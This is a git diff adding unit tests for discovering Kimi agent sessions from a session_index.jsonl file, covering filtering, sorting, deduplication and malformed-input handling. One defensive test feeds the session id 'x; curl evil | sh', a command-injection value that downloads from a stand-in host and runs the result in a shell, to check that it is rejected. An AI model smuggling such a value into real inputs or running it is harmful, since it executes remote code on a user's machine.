@@ -217,6 +217,252 @@ describe("Cursor project-scoped chat-index discovery", () => {
   });
 });
 
+describe("Kimi project-scoped session_index.jsonl discovery", () => {
+  const indexJsonl = (records: (Record<string, unknown> | string)[]) =>
+    records
+      .map((r) => (typeof r === "string" ? r : JSON.stringify(r)))
+      .join("\n");
+
+  it("filters records by workDir and sorts newest-first by sessionDir mtime", async () => {
+    readFile.mockResolvedValue(
+      indexJsonl([
+        {
+          sessionId: "old-session",
+          sessionDir: "/kimi-home/sessions/proj/old-session",
+          workDir: "/proj",
+        },
+        {
+          sessionId: "other-project",
+          sessionDir: "/kimi-home/sessions/other/other-project",
+          workDir: "/other/project",
+        },
+        {
+          sessionId: "new-session",
+          sessionDir: "/kimi-home/sessions/proj/new-session",
+          workDir: "/proj",
+        },
+      ]),
+    );
+    stat.mockImplementation((p: string) =>
+      Promise.resolve({
+        mtimeMs: p.includes("new-session") ? 2000 : p.includes("old-session") ? 1000 : 500,
+      }),
+    );
+
+    const list = await listSessionIds("kimi", "/proj", { KIMI_CODE_HOME: "/kimi-home" });
+
+    expect(readFile).toHaveBeenCalledWith("/kimi-home/session_index.jsonl", "utf8");
+    expect(list).toEqual([
+      { sessionId: "new-session", lastModified: new Date(2000).toISOString() },
+      { sessionId: "old-session", lastModified: new Date(1000).toISOString() },
+    ]);
+  });
+
+  it("tolerates malformed lines and records with missing fields", async () => {
+    readFile.mockResolvedValue(
+      indexJsonl([
+        "not json at all",
+        "{broken json",
+        { sessionDir: "/kimi-home/sessions/proj/no-id", workDir: "/proj" },
+        { sessionId: "no-workdir", sessionDir: "/kimi-home/sessions/proj/no-workdir" },
+        { sessionId: 42, sessionDir: "/kimi-home/sessions/proj/numeric", workDir: "/proj" },
+        {
+          sessionId: "good-session",
+          sessionDir: "/kimi-home/sessions/proj/good-session",
+          workDir: "/proj",
+        },
+        "",
+      ]),
+    );
+    stat.mockResolvedValue({ mtimeMs: 1000 });
+
+    const list = await listSessionIds("kimi", "/proj", { KIMI_CODE_HOME: "/kimi-home" });
+
+    expect(list.map((entry) => entry.sessionId)).toEqual(["good-session"]);
+  });
+
+  it("rejects shell-unsafe session ids from the index (defense-in-depth)", async () => {
+    readFile.mockResolvedValue(
+      indexJsonl([
+        {
+          sessionId: "x; curl evil | sh",
+          sessionDir: "/kimi-home/sessions/proj/evil",
+          workDir: "/proj",
+        },
+      ]),
+    );
+    stat.mockResolvedValue({ mtimeMs: 100 });
+
+    await expect(
+      discoverLatestSessionId("kimi", "/proj", { KIMI_CODE_HOME: "/kimi-home" }),
+    ).resolves.toBeNull();
+  });
+
+  it("falls back to index append order when sessionDir mtimes are unavailable", async () => {
+    // The index is append-only, so later lines are newer. With no stat-able
+    // sessionDir (and one record missing sessionDir entirely), discovery must
+    // return the ids newest-first by file order.
+    readFile.mockResolvedValue(
+      indexJsonl([
+        { sessionId: "first", workDir: "/proj" },
+        {
+          sessionId: "second",
+          sessionDir: "/kimi-home/sessions/proj/second",
+          workDir: "/proj",
+        },
+        {
+          sessionId: "third",
+          sessionDir: "/kimi-home/sessions/proj/third",
+          workDir: "/proj",
+        },
+      ]),
+    );
+    stat.mockRejectedValue(new Error("ENOENT"));
+
+    const list = await listSessionIds("kimi", "/proj", { KIMI_CODE_HOME: "/kimi-home" });
+
+    expect(list.map((entry) => entry.sessionId)).toEqual(["third", "second", "first"]);
+  });
+
+  it("sorts mixed mtime/missing-mtime records deterministically, true newest first", async () => {
+    // Review case: A mtime 5000 idx 0, B no mtime idx 1, C mtime 100 idx 2.
+    // The old comparator mixed per-pair criteria (mtime when both present,
+    // else reverse index order), which is non-transitive — V8's TimSort could
+    // order this cycle as C/B/A, burying the true newest (A) outside the
+    // head/limit slice. The transitive comparator must yield A, C, B.
+    readFile.mockResolvedValue(
+      indexJsonl([
+        { sessionId: "a", sessionDir: "/kimi-home/sessions/proj/a", workDir: "/proj" },
+        { sessionId: "b", workDir: "/proj" }, // no sessionDir → no mtime
+        { sessionId: "c", sessionDir: "/kimi-home/sessions/proj/c", workDir: "/proj" },
+      ]),
+    );
+    stat.mockImplementation((p: string) => {
+      if (p.endsWith("session_index.jsonl")) return Promise.resolve({ mtimeMs: 7000 });
+      if (p.endsWith("/a")) return Promise.resolve({ mtimeMs: 5000 });
+      if (p.endsWith("/c")) return Promise.resolve({ mtimeMs: 100 });
+      return Promise.reject(new Error("ENOENT"));
+    });
+
+    const list = await listSessionIds("kimi", "/proj", { KIMI_CODE_HOME: "/kimi-home" });
+
+    expect(list).toEqual([
+      { sessionId: "a", lastModified: new Date(5000).toISOString() },
+      { sessionId: "c", lastModified: new Date(100).toISOString() },
+      // B sorts oldest (missing mtime = -Infinity) even though its lastModified
+      // falls back to the index file's mtime.
+      { sessionId: "b", lastModified: new Date(7000).toISOString() },
+    ]);
+  });
+
+  it("collapses re-appended duplicate sessionIds to the newest occurrence within limit", async () => {
+    // The index is append-only: "dup" was re-appended on update (idx 2, mtime
+    // 3000) after its original row (idx 0, mtime 1000). The picker keys rows
+    // by sessionId, so the id must appear exactly once — as the newest row.
+    readFile.mockResolvedValue(
+      indexJsonl([
+        { sessionId: "dup", sessionDir: "/kimi-home/sessions/proj/dup-old", workDir: "/proj" },
+        { sessionId: "other", sessionDir: "/kimi-home/sessions/proj/other", workDir: "/proj" },
+        { sessionId: "dup", sessionDir: "/kimi-home/sessions/proj/dup-new", workDir: "/proj" },
+      ]),
+    );
+    stat.mockImplementation((p: string) => {
+      if (p.endsWith("session_index.jsonl")) return Promise.resolve({ mtimeMs: 9000 });
+      if (p.endsWith("/dup-old")) return Promise.resolve({ mtimeMs: 1000 });
+      if (p.endsWith("/other")) return Promise.resolve({ mtimeMs: 2000 });
+      if (p.endsWith("/dup-new")) return Promise.resolve({ mtimeMs: 3000 });
+      return Promise.reject(new Error("ENOENT"));
+    });
+
+    const list = await listSessionIds("kimi", "/proj", { KIMI_CODE_HOME: "/kimi-home" }, 10);
+
+    expect(list).toEqual([
+      { sessionId: "dup", lastModified: new Date(3000).toISOString() },
+      { sessionId: "other", lastModified: new Date(2000).toISOString() },
+    ]);
+    // Dedup happens before the slice, so a limit never truncates to duplicates
+    // or drops a unique session in favour of one.
+    const limited = await listSessionIds("kimi", "/proj", { KIMI_CODE_HOME: "/kimi-home" }, 1);
+    expect(limited).toEqual([
+      { sessionId: "dup", lastModified: new Date(3000).toISOString() },
+    ]);
+  });
+
+  it("never leaks Date(0)/1970 into results when every stat fails", async () => {
+    // Session dirs AND the index file itself are unstat-able: lastModified
+    // must be omitted entirely rather than falling back to the epoch.
+    readFile.mockResolvedValue(
+      indexJsonl([
+        { sessionId: "no-dir-stat", sessionDir: "/kimi-home/sessions/proj/x", workDir: "/proj" },
+        { sessionId: "no-dir", workDir: "/proj" },
+      ]),
+    );
+    stat.mockRejectedValue(new Error("ENOENT"));
+
+    const list = await listSessionIds("kimi", "/proj", { KIMI_CODE_HOME: "/kimi-home" });
+
+    expect(list.map((entry) => entry.sessionId)).toEqual(["no-dir", "no-dir-stat"]);
+    for (const entry of list) {
+      expect(entry.lastModified).toBeUndefined();
+    }
+    expect(JSON.stringify(list)).not.toContain("1970");
+  });
+
+  it("honours the KIMI_CODE_HOME override", async () => {
+    readFile.mockResolvedValue(
+      indexJsonl([
+        { sessionId: "s1", sessionDir: "/custom-kimi/sessions/p/s1", workDir: "/proj" },
+      ]),
+    );
+    stat.mockResolvedValue({ mtimeMs: 1000 });
+
+    await listSessionIds("kimi", "/proj", { KIMI_CODE_HOME: "/custom-kimi" });
+
+    expect(readFile).toHaveBeenCalledWith("/custom-kimi/session_index.jsonl", "utf8");
+  });
+
+  it("defaults to $HOME/.kimi-code when KIMI_CODE_HOME is unset", async () => {
+    readFile.mockResolvedValue(
+      indexJsonl([
+        { sessionId: "s1", sessionDir: "/home/u/.kimi-code/sessions/p/s1", workDir: "/proj" },
+      ]),
+    );
+    stat.mockResolvedValue({ mtimeMs: 1000 });
+
+    await listSessionIds("kimi", "/proj", { HOME: "/home/u" });
+
+    expect(readFile).toHaveBeenCalledWith("/home/u/.kimi-code/session_index.jsonl", "utf8");
+  });
+
+  it("returns [] when the index file cannot be read", async () => {
+    readFile.mockRejectedValue(new Error("ENOENT"));
+
+    await expect(
+      listResumableSessions("kimi", "/proj", { KIMI_CODE_HOME: "/missing" }),
+    ).resolves.toEqual([]);
+  });
+
+  it("yields id + timestamp (no preview) through the picker shape", async () => {
+    readFile.mockResolvedValue(
+      indexJsonl([
+        {
+          sessionId: "kimi-sess-1",
+          sessionDir: "/kimi-home/sessions/proj/kimi-sess-1",
+          workDir: "/proj",
+        },
+      ]),
+    );
+    stat.mockResolvedValue({ mtimeMs: 1000 });
+
+    const list = await listResumableSessions("kimi", "/proj", { KIMI_CODE_HOME: "/kimi-home" });
+
+    expect(list).toHaveLength(1);
+    expect(list[0].sessionId).toBe("kimi-sess-1");
+    expect(list[0].firstUserMessage).toBeUndefined();
+    expect(list[0].gitBranch).toBeUndefined();
+  });
+});
+
 describe("discoverLatestSessionId — claude delegates to listSessions", () => {
   it("uses the streaming parser and returns its newest sessionId", async () => {
     listSessions.mockResolvedValue([
